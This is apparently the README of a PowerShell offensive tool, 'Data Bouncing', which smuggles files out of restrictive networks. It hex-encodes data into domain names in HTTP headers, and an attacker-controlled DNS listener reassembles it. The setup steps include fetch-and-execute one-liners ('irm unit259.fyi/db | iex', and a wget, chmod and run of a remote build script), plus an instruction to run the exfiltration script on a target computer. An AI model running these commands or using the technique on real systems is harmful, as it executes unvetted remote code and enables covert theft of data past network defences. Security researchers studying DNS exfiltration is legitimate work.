# Data Bouncing - PowerShell Version

<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dataBouncing.png" width="1000" alt="DataBounce banner">

## Overview
Data Bouncing is a technique for transmitting data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version encapsulates core functionalities of data bouncing, including reconnaissance, data exfiltration, and file reassembly, based on a proof of concept (PoC) by John and Dave. More details can be found at [The Contractor](https://thecontractor.io/data-bouncing/).

This project owes a significant debt of gratitude to the pioneering efforts and inventive ideas of John and Dave, whose original concepts laid the groundwork for our development. Their innovative approach to data bouncing and its applications in security and networking have been a guiding light for us. We encourage you to delve deeper into their work and insights, available at The Contractor, a treasure trove of knowledge in this domain. Their contributions to the field have not only inspired our work but have also enriched the broader community of technology enthusiasts and security professionals. We extend our heartfelt thanks to them for leading the way and for continuing to push the boundaries of what's possible.

## Components

<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dbheroes.png" width="1000" alt="DataBounce banner">

The project consists of two main scripts:
- `nightCrawler.ps1`: Manages data exfiltration.
- `deadPool.ps1`: Handles reassembly of the exfiltrated data.

### `nightCrawler.ps1`
This script encodes a file into hexadecimal chunks and sends each chunk as part of a domain name in an HTTP request header. It's used for exfiltrating data from restrictive networks.

### `deadPool.ps1`
Processes data received from `nightCrawler.ps1`, finding patterns in logs, assembling data chunks, and converting them back to their original form.

## Usage
### Prerequisites
- A controlled DNS server.
- For hobbyists, [InteractSh](https://github.com/projectdiscovery/interactsh) is recommended.

### Setting Up
1. **Listener Setup**:
   Use [InteractSh Web Client](https://app.interactsh.com/#/) or the [Build Script](https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactshBuild.sh) with Ubuntu 22.04.

   You can use this single one liner to download, install, and run InteractSh on your server: 

```bash
   wget "https://unit259.fyi/interactshbuild" && chmod +x interactshbuild && ./interactshbuild
```

   <img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactShBuild.gif" width="600" alt="Description of GIF">

   Start the InteractSh Client on your listener machine:

2. **Target Machine Preparation**:
   Prepare your data to be exfiltrated. 
   Run this [nightCrawler.ps1](https://github.com/Unit-259/DataBouncing/blob/main/nightCrawler.ps1) script on the target computer.


### Running the Scripts
1. **Data Exfiltration with `nightCrawler.ps1`**:
      - provide url for OOB Lister
      - provide filepath of target exfil data

      Running `irm unit259.fyi/db | iex` will quickly load it on their system.

      You have the option of using our GUI as well. The following one liner will open it on any pc for you instantly. 
      `irm unit259.fyi/dbgui | iex`

      ![DataBouncing GUI](https://github.com/Unit-259/DataBouncing/blob/main/Resources/nightCrawler.png?raw=true)

2. **Data Reconstruction with `deadpool.ps1`**:
      - run it

## Notes
- Remember to replace placeholders like 'your-regex', 'your-domain.oast.online', etc., with actual values relevant to your setup.
- The scripts are part of a PoC and should be used responsibly.

## Disclaimer
This project is for educational purposes only. Users are responsible for ensuring they comply with all applicable laws and regulations.
